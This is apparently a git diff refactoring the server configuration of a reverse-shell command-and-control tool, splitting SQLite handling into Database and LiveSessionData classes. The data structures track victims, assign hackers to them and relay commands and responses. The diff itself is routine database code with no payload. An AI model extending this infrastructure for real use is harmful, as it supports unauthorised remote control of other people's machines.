@@ -5,7 +5,7 @@ import json as js
 import sqlite3 as sq
 from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser, Namespace
 from pathlib import Path
-from typing import Any
+from typing import Any, Literal, Optional
 
 import reverse_shell.utils as ut
 
@@ -14,11 +14,12 @@ from reverse_shell import __app_name__, __version__
 from reverse_shell.server import ErrorCodes as ec
 
 
-class Config:
-    def __init__(self, config: Namespace, allow_multi_thread_db_access=False):
-        # ---- Schema
-
-        # Required database schema for the session and data databases.
+# Gonna break down the config class into multiple classes.
+class Database:
+    def __init__(
+        self, db_path: Path | None, base_dir: Path, allow_multithreaded_db: bool = False
+    ):
+        # ---- Required database schemas
         self.session_data_schema = [
             """
         CREATE TABLE IF NOT EXISTS victim_info(
@@ -57,21 +58,149 @@ class Config:
         """,
         ]
 
-        # ---- MultiThreaded DB(mainly used for testing)
-        self.allow_multi_thread_db_access = allow_multi_thread_db_access
+        # ---- Creating instances of the parameters
+        self.allow_multithreaded_db = allow_multithreaded_db
+        self.base_dir = base_dir
 
+        # ---- DB initialization
+        self.session_data = self.get_database(
+            "data.db", db_path, self.session_data_schema
+        )
+
+    def strip_schema(self, schema: str):
+        """Get rid of new lines and strip a schema to make it ready for comparison also remove the `IF NOT EXISTS` that will ruin the string validation."""
+
+        # remove the `IF NOT EXISTS` and `;` since it doesn't exist in the sqlite_schema table
+        schema = schema.replace("IF NOT EXISTS ", "")
+        schema = schema.replace(";", "")
+
+        schema_lst = schema.splitlines()
+        schema_lst = [schema.strip() for schema in schema_lst]
+
+        return "".join(schema_lst)
+
+    def query(self, cur: sq.Cursor, query: str, __params=None):
+        """Return all results that return from a database query provided by `query` and return None when`sqlite3.OperationalError` occurs"""
+        # Let's execute and handle the query
+        try:
+            cur.execute(query, __params if __params is not None else ())
+            return cur.fetchall()
+        except sq.Error:
+            return None
+
+    def execute(self, statement: str, __params=None):
+        """Execute the `statement` on the database and return `None` if `sqlite3.OperationalError` get's raised and the cursor if successful."""
+        try:
+            conn = self.session_data.cursor()
+            res_cur = conn.execute(statement, __params if __params is not None else ())
+            self.session_data.commit()
+            return res_cur
+        except sq.Error as e:
+            ut.log("debug", f"SQLERROR: {e}")
+            ut.log("debug", f"    from: `{statement}`")
+            return None
+
+    def get_database(
+        self, db_name: str, db_path: Path | None, db_schema: list[str]
+    ) -> sq.Connection:
+        """Return a sqlite3 database connection using the user_config_option parameter and validate it using the db_schema option if the database is not provided by the user needed tables will be created using the db_schema list"""
+
+        db_filepath = db_path
+        already_existing_db = True
+
+        if db_filepath is None:
+            # Or if we are not provided with a database
+            # create the base_directory and the database file
+            self.base_dir.mkdir(exist_ok=True, parents=True)
+            db_filepath = self.base_dir / db_name
+            # Since the file is new it is not user given
+            already_existing_db = False
+
+        elif isinstance(db_filepath, Path):
+            # Exit with an error if the file provided by the user doesn't exist
+            if not db_filepath.resolve().exists():
+                ut.error_exit(
+                    f"The file `{db_filepath}` doesn't exist.", ec.file_not_found
+                )
+
+        db = sq.connect(db_filepath, check_same_thread=not self.allow_multithreaded_db)
+        cur = db.cursor()
+
+        # Let's now validate the database based on the db_schema argument
+        # if the is_user_given var is True.
+
+        # First we are going to get the SQL command
+        # that is created for each of the table created
+        # found in the sqlite_master table
+        cur.execute("SELECT sql FROM sqlite_master")
+        schemas = cur.fetchall()
+
+        # If the database is brand new and doesn't have anything on it and it's
+        # user provided then we will treat it like a not user given file. if it makes sense
+        if already_existing_db and schemas != []:
+            # Unpack the inner tuples in the list
+            schemas = [self.strip_schema(i[0]) for i in schemas if i[0] is not None]
+
+            # We need to strip_schema the database schema given to remove
+            # spaces and stuff
+            stripped_db_schema = [self.strip_schema(i) for i in db_schema]
+
+            # validate the elements
+            is_valid = all(
+                self.strip_schema(item) in stripped_db_schema for item in schemas
+            )
+            if not is_valid:
+                ut.error_exit(
+                    "Invalid SQL database please use one generated by the server.",
+                    ec.invalid_file,
+                )
+
+        else:
+            # Create the tables needed using the db_schema arg
+            # we're just going to execute the commands we get from
+            # the db_schema
+            for schema_cmd in db_schema:
+                cur.execute(schema_cmd)
+
+            db.commit()
+
+        return db
+
+
+class LiveSessionData:
+    def __init__(self):
         # A map of a victim with it's hacker that are in a live session
         # used to prevent multiple hackers hacking the same machine at once.
         self.hacking_sessions: dict[str, str] = {
             # victim_id: hacker_id
         }
 
+        # A live map of the hackers with their commands they send
+        # and responses they receive.
+        self.hacker_victim_communication: dict[
+            str, dict[Literal["command", "response"], list[str] | str]
+        ] = {
+            # hacker_id: {
+            # command: "current_cmd_set_by_hacker",
+            # response: [] # Responses are lists because a hacker might miss something so rather than
+            #  overwriting the key like a string the server will append it on the list.
+            # }
+        }
+
+
+class Config:
+    def __init__(self, config: Namespace, database: Optional[Database] = None):
+        # ---- Schema
         self.config = config
 
-        # ---- Database initialization
+        # ---- Setup the profile file
         self.profile, self.profile_path = self.get_profile("profile.json")
-        self.session_data_db = self.get_database(
-            "data.db", self.config.session_data, self.session_data_schema
+
+        # Initialize the database according to config
+        self.database = (
+            Database(config.session_data, config.base_dir)
+            if database is None
+            else database
         )
 
         # ---- Tokens
@@ -185,39 +314,6 @@ class Config:
 
         return token
 
-    def strip_schema(self, schema: str):
-        """Get rid of new lines and strip a schema to make it ready for comparison also remove the `IF NOT EXISTS` that will ruin the string validation."""
-
-        # remove the `IF NOT EXISTS` and `;` since it doesn't exist in the sqlite_schema table
-        schema = schema.replace("IF NOT EXISTS ", "")
-        schema = schema.replace(";", "")
-
-        schema_lst = schema.splitlines()
-        schema_lst = [schema.strip() for schema in schema_lst]
-
-        return "".join(schema_lst)
-
-    def query_db(self, cur: sq.Cursor, query: str, __params=None):
-        """Return all results that return from a database query provided by `query` and return None when`sqlite3.OperationalError` occurs"""
-        # Let's execute and handle the query
-        try:
-            cur.execute(query, __params if __params is not None else ())
-            return cur.fetchall()
-        except sq.Error:
-            return None
-
-    def execute_on_session_db(self, statement: str, __params=None):
-        """Execute the `statement` on the database and return `None` if `sqlite3.OperationalError` get's raised and the cursor if successful."""
-        try:
-            conn = self.session_data_db.cursor()
-            res_cur = conn.execute(statement, __params if __params is not None else ())
-            self.session_data_db.commit()
-            return res_cur
-        except sq.Error as e:
-            ut.log("debug", f"SQLERROR: {e}")
-            ut.log("debug", f"    from: `{statement}`")
-            return None
-
     def get_profile(self, profile_name: str):
         profile_filepath = self.config.profile
 
@@ -247,74 +343,6 @@ class Config:
                 "Invalid session file. Please use server generated session files.",
                 ec.invalid_file,
             )
-
-    def get_database(
-        self, db_name: str, user_config_option: None | Path, db_schema: list[str]
-    ) -> sq.Connection:
-        """Return a sqlite3 database connection using the user_config_option parameter and validate it using the db_schema option if the database is not provided by the user needed tables will be created using the db_schema list"""
-
-        db_filepath = user_config_option
-        is_user_given = True
-
-        if db_filepath is None:
-            # Or the user didn't provide us with a database
-            # create the base_directory and the database file
-            self.config.base_dir.mkdir(exist_ok=True, parents=True)
-            db_filepath = self.config.base_dir / db_name
-            # Since the file is new it is not user given
-            is_user_given = False
-
-        elif isinstance(db_filepath, Path):
-            # Exit with an error if the file provided by the user doesn't exist
-            if not db_filepath.resolve().exists():
-                ut.error_exit(
-                    f"The file `{db_filepath}` doesn't exist.", ec.file_not_found
-                )
-
-        db = sq.connect(
-            db_filepath, check_same_thread=not self.allow_multi_thread_db_access
-        )
-        cur = db.cursor()
-
-        # Let's now validate the database based on the db_schema argument
-        # if the is_user_given var is True.
-
-        # First we are going to get the SQL command
-        # that is created for each of the table created
-        # found in the sqlite_master table
-        cur.execute("SELECT sql FROM sqlite_master")
-        schemas = cur.fetchall()
-
-        # If the database is brand new and doesn't have anything on it and it's
-        # user provided then we will treat it like a not user given file. if it makes sense
-        if is_user_given and schemas != []:
-            # Unpack the inner tuples in the list
-            schemas = [self.strip_schema(i[0]) for i in schemas if i[0] is not None]
-
-            # We need to strip_schema the database schema given to remove
-            # spaces and stuff
-            stripped_db_schema = [self.strip_schema(i) for i in db_schema]
-
-            # validate the elements
-            is_valid = all(
-                self.strip_schema(item) in stripped_db_schema for item in schemas
-            )
-            if not is_valid:
-                ut.error_exit(
-                    "Invalid SQL database please use one generated by the server.",
-                    ec.invalid_file,
-                )
-
-        else:
-            # Create the tables needed using the db_schema arg
-            # we're just going to execute the commands we get from
-            # the db_schema
-            for schema_cmd in db_schema:
-                cur.execute(schema_cmd)
-
-            db.commit()
-
-        return db
 
 
 def get_argument_parser():
